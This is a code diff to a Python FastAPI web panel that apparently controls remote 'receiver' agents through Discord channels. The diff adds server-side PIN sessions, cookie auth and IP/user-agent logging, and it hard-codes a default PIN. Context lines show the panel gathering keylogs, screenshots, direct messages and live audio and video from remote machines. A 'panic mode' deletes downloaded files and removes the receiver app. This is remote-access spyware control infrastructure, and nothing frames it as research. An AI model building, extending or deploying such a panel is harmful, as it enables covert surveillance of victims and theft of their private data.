@@ -43,6 +43,12 @@ COMMAND_CHANNEL_ID = int(os.getenv("COMMAND_CHANNEL_ID", "1360236257212633260"))
 TARGET_CHANNEL_ID = int(os.getenv("TARGET_CHANNEL_ID", "0"))
 LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", "1457385049845403648"))
 BOT_TAG = ""
+PANEL_PIN = os.getenv("PANEL_PIN", "S4mb")
+try:
+    PIN_SESSION_TTL = max(60, int(os.getenv("PIN_SESSION_TTL", "300")))
+except Exception:
+    PIN_SESSION_TTL = 300
+PIN_COOKIE_NAME = "panel_session"
 
 assert CONTROLLER_TOKEN
 assert COMMAND_CHANNEL_ID
@@ -51,6 +57,7 @@ assert TARGET_CHANNEL_ID
 ROOT_DIR = Path(__file__).parent
 SCREENSHOT_DIR = ROOT_DIR / "screenshots"
 SCREENSHOT_LOG = ROOT_DIR / "screenshots.json"
+PIN_LOG_FILE = ROOT_DIR / "pin_sessions.jsonl"
 _latest_screenshot: dict[str, str] = {"url": "", "message_id": "", "ts": ""}
 _latest_keylog: dict[str, str] = {"text": "", "message_id": "", "ts": ""}
 _dm_messages: list[str] = []
@@ -58,6 +65,7 @@ _latest_dm_user: dict[str, str] = {"id": "", "name": ""}
 STATE_FILE = ROOT_DIR / "receivers.json"
 _receivers: dict[str, dict] = {}  # id -> {"alias": str, "last_seen": float, "tag": str, "mode": str}
 _selected_receiver: Optional[str] = None
+_pin_sessions: dict[str, dict] = {}
 STALE_SECONDS = 90
 PRUNE_SECONDS = 60 * 60 * 24 * 30
 MAX_DM_MESSAGES = 200
@@ -104,6 +112,78 @@ def _save_screenshot_log():
         SCREENSHOT_LOG.write_text(json.dumps(_screenshot_log))
     except Exception:
         pass
+
+def _prune_pin_sessions(now: Optional[float] = None):
+    if now is None:
+        now = time.time()
+    for token, info in list(_pin_sessions.items()):
+        if info.get("expires", 0) <= now:
+            _pin_sessions.pop(token, None)
+
+def _append_pin_log(entry: dict):
+    entry["ts"] = time.time()
+    try:
+        with PIN_LOG_FILE.open("a", encoding="utf-8") as handle:
+            handle.write(json.dumps(entry) + "\n")
+    except Exception:
+        pass
+
+def _get_client_ip(request: Request) -> str:
+    forwarded = request.headers.get("x-forwarded-for")
+    if forwarded:
+        return forwarded.split(",")[0].strip()
+    if request.client:
+        return request.client.host
+    return ""
+
+def _get_session_token(cookies: dict) -> Optional[str]:
+    if not cookies:
+        return None
+    return cookies.get(PIN_COOKIE_NAME)
+
+def _validate_pin_session(token: Optional[str], refresh: bool = False) -> bool:
+    if not token:
+        return False
+    _prune_pin_sessions()
+    info = _pin_sessions.get(token)
+    if not info:
+        return False
+    now = time.time()
+    if info.get("expires", 0) <= now:
+        _pin_sessions.pop(token, None)
+        return False
+    if refresh:
+        info["expires"] = now + PIN_SESSION_TTL
+        info["last_seen"] = now
+    return True
+
+def _session_ok(request: Request, refresh: bool = False) -> bool:
+    token = _get_session_token(request.cookies)
+    return _validate_pin_session(token, refresh=refresh)
+
+def _session_ok_from_cookies(cookies: dict, refresh: bool = False) -> bool:
+    token = _get_session_token(cookies or {})
+    return _validate_pin_session(token, refresh=refresh)
+
+def _create_pin_session(request: Request, client_id: str) -> str:
+    now = time.time()
+    token = secrets.token_urlsafe(24)
+    info = {
+        "client_id": client_id or "",
+        "ip": _get_client_ip(request),
+        "ua": request.headers.get("user-agent", ""),
+        "created": now,
+        "last_seen": now,
+        "expires": now + PIN_SESSION_TTL,
+    }
+    _pin_sessions[token] = info
+    _append_pin_log({
+        "hwid": info["client_id"],
+        "ip": info["ip"],
+        "ua": info["ua"],
+        "expires": info["expires"],
+    })
+    return token
 
 def _prune_receivers(now: Optional[float] = None) -> bool:
     global _selected_receiver
@@ -336,6 +416,21 @@ _live_hubs: dict[str, LiveHub] = {}
 app = FastAPI(title="Controller")
 SCREENSHOT_DIR.mkdir(parents=True, exist_ok=True)
 app.mount("/screenshots", StaticFiles(directory=str(SCREENSHOT_DIR)), name="screenshots")
+
+@app.middleware("http")
+async def pin_session_guard(request: Request, call_next):
+    path = request.url.path
+    if path.startswith("/api") or path.startswith("/ui"):
+        if path in ("/api/pin", "/api/session"):
+            return await call_next(request)
+        if not _session_ok(request, refresh=True):
+            if path.startswith("/ui"):
+                wants_json = request.headers.get("x-requested-with") == "fetch"
+                if wants_json:
+                    return JSONResponse({"ok": False, "error": "unauthorized"}, status_code=401)
+                return RedirectResponse(url="/", status_code=303)
+            return JSONResponse({"ok": False, "error": "unauthorized"}, status_code=401)
+    return await call_next(request)
 
 CONTROL_HTML = """<!doctype html>
 <html lang="en">
@@ -621,40 +716,106 @@ CONTROL_HTML = """<!doctype html>
       <h1>Enter PIN</h1>
       <p style="margin: 4px 0 12px; color:var(--muted);">PIN required to access controls.</p>
       <form id="pin-form">
-        <input id="pin-input" type="password" inputmode="numeric" autocomplete="off" placeholder="PIN" required>
+        <input id="pin-input" type="password" inputmode="text" autocomplete="off" placeholder="PIN" required>
         <button type="submit">Unlock</button>
       </form>
       <small id="pin-error" style="color:#f97316;"></small>
     </div>
   </div>
   <script>
-    const REQUIRED_PIN = "05701842";
     const pinOverlay = document.getElementById('pin-overlay');
     const pinForm = document.getElementById('pin-form');
     const pinInput = document.getElementById('pin-input');
     const pinError = document.getElementById('pin-error');
+    const PIN_CLIENT_KEY = 'panel_client_id';
+    let sessionActive = false;
+    function lockUI(message) {
+      sessionActive = false;
+      document.body.classList.add('locked');
+      if (pinOverlay) pinOverlay.style.display = 'flex';
+      if (pinError) pinError.textContent = message || '';
+    }
     function unlockUI() {
+      sessionActive = true;
       document.body.classList.remove('locked');
       if (pinOverlay) pinOverlay.style.display = 'none';
     }
-    if (pinForm) {
-      pinForm.addEventListener('submit', (e) => {
-        e.preventDefault();
-        if (pinInput && pinInput.value === REQUIRED_PIN) {
-          pinError.textContent = '';
-          pinInput.value = '';
-          unlockUI();
-          return;
+    function getClientId() {
+      try {
+        let existing = localStorage.getItem(PIN_CLIENT_KEY);
+        if (existing) return existing;
+        let value = '';
+        if (window.crypto && crypto.randomUUID) {
+          value = crypto.randomUUID();
+        } else {
+          value = 'cid-' + Math.random().toString(36).slice(2) + Date.now().toString(36);
         }
-        if (pinError) pinError.textContent = 'Incorrect PIN';
+        localStorage.setItem(PIN_CLIENT_KEY, value);
+        return value;
+      } catch (e) {
+        return 'cid-' + Math.random().toString(36).slice(2) + Date.now().toString(36);
+      }
+    }
+    async function checkSession() {
+      try {
+        const res = await fetch('/api/session');
+        if (res.ok) {
+          const data = await res.json();
+          if (data && data.ok) {
+            unlockUI();
+            return true;
+          }
+        }
+      } catch (e) { /* ignore */ }
+      lockUI('');
+      return false;
+    }
+    async function submitPin(pinValue) {
+      const body = new URLSearchParams();
+      body.set('pin', pinValue || '');
+      body.set('client_id', getClientId());
+      try {
+        const res = await fetch('/api/pin', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body,
+        });
+        if (res.ok) {
+          if (pinError) pinError.textContent = '';
+          unlockUI();
+          return true;
+        }
+      } catch (e) { /* ignore */ }
+      lockUI('Incorrect PIN');
+      return false;
+    }
+    async function fetchAuthed(url, options) {
+      const opts = options ? { ...options } : {};
+      const headers = Object.assign({ 'X-Requested-With': 'fetch' }, opts.headers || {});
+      opts.headers = headers;
+      const res = await fetch(url, opts);
+      if (res.status === 401) {
+        lockUI(sessionActive ? 'Session expired. Enter PIN.' : '');
+        return null;
+      }
+      return res;
+    }
+    if (pinForm) {
+      pinForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        const value = pinInput ? pinInput.value : '';
+        const ok = await submitPin(value);
         if (pinInput) {
           pinInput.value = '';
-          pinInput.focus();
+          if (!ok) pinInput.focus();
         }
       });
     }
-    window.addEventListener('load', () => {
-      if (pinInput) pinInput.focus();
+    window.addEventListener('load', async () => {
+      await checkSession();
+      if (document.body.classList.contains('locked') && pinInput) {
+        pinInput.focus();
+      }
     });
     let selectedReceiver = null;
     let liveSocket = null;
@@ -753,8 +914,8 @@ CONTROL_HTML = """<!doctype html>
     }
     async function refreshReceivers() {
       try {
-        const res = await fetch('/api/receivers');
-        if (!res.ok) return;
+        const res = await fetchAuthed('/api/receivers');
+        if (!res || !res.ok) return;
         const data = await res.json();
         selectedReceiver = data.selected || null;
         const wrap = document.getElementById('receiver-list');
@@ -882,8 +1043,8 @@ CONTROL_HTML = """<!doctype html>
         const list = document.getElementById('screenshot-list');
         const empty = document.getElementById('screenshot-empty');
         if (!list) return;
-        const res = await fetch('/api/screenshots');
-        if (!res.ok) return;
+        const res = await fetchAuthed('/api/screenshots');
+        if (!res || !res.ok) return;
         const data = await res.json();
         const items = data.items || [];
         list.innerHTML = '';
@@ -926,8 +1087,8 @@ CONTROL_HTML = """<!doctype html>
       try {
         const output = document.getElementById('log-output');
         if (!output) return;
-        const res = await fetch('/api/logs');
-        if (!res.ok) return;
+        const res = await fetchAuthed('/api/logs');
+        if (!res || !res.ok) return;
         const data = await res.json();
         if (data.text) {
           output.textContent = data.text;
@@ -938,8 +1099,8 @@ CONTROL_HTML = """<!doctype html>
       try {
         const output = document.getElementById('message-output');
         if (!output) return;
-        const res = await fetch('/api/messages');
-        if (!res.ok) return;
+        const res = await fetchAuthed('/api/messages');
+        if (!res || !res.ok) return;
         const data = await res.json();
         output.textContent = data.text || 'Waiting for messages...';
       } catch (e) { /* ignore */ }
@@ -948,7 +1109,7 @@ CONTROL_HTML = """<!doctype html>
       const method = (form.method || 'post').toUpperCase();
       const data = new URLSearchParams(new FormData(form));
       try {
-        const res = await fetch(form.action, {
+        const res = await fetchAuthed(form.action, {
           method,
           body: data,
           headers: {
@@ -956,6 +1117,9 @@ CONTROL_HTML = """<!doctype html>
             'X-Requested-With': 'fetch',
           },
         });
+        if (!res) {
+          return false;
+        }
         if (!(res.status >= 200 && res.status < 400)) {
           alert('Request failed.');
           return false;
@@ -1025,8 +1189,8 @@ CONTROL_HTML = """<!doctype html>
         const ok = confirm('Panic mode will delete downloaded files and remove the receiver app. Continue?');
         if (!ok) return;
         try {
-          const res = await fetch('/ui/panic', { method: 'POST' });
-          if (!res.ok) {
+          const res = await fetchAuthed('/ui/panic', { method: 'POST' });
+          if (!res || !res.ok) {
             alert('Panic request failed.');
             return;
           }
@@ -1066,6 +1230,9 @@ async def audio_ws(ws: WebSocket):
 @app.websocket("/live/{rid}")
 async def live_ws(ws: WebSocket, rid: str, role: str = "viewer"):
     await ws.accept()
+    if role != "sender" and not _session_ok_from_cookies(ws.cookies, refresh=True):
+        await ws.close(code=4401)
+        return
     hub = _live_hubs.setdefault(rid, LiveHub())
     if role == "sender":
         try:
@@ -1191,6 +1358,28 @@ async def gif_stop():
     await _send_cmd(_cmd_with_selection("DISPLAY_GIF_STOP"))
     _set_receiver_mode(_selected_receiver, "")
     return JSONResponse({"ok": True})
+
+@app.get("/api/session")
+async def api_session(request: Request):
+    ok = _session_ok(request, refresh=True)
+    return JSONResponse({"ok": ok})
+
+@app.post("/api/pin")
+async def api_pin(request: Request):
+    pin = await _read_form_value(request, "pin")
+    client_id = await _read_form_value(request, "client_id") or ""
+    if not pin or pin != PANEL_PIN:
+        return JSONResponse({"ok": False, "error": "invalid"}, status_code=401)
+    token = _create_pin_session(request, client_id)
+    resp = JSONResponse({"ok": True})
+    resp.set_cookie(
+        PIN_COOKIE_NAME,
+        token,
+        max_age=PIN_SESSION_TTL,
+        httponly=True,
+        samesite="strict",
+    )
+    return resp
 
 @app.get("/api/screenshot")
 async def api_screenshot():
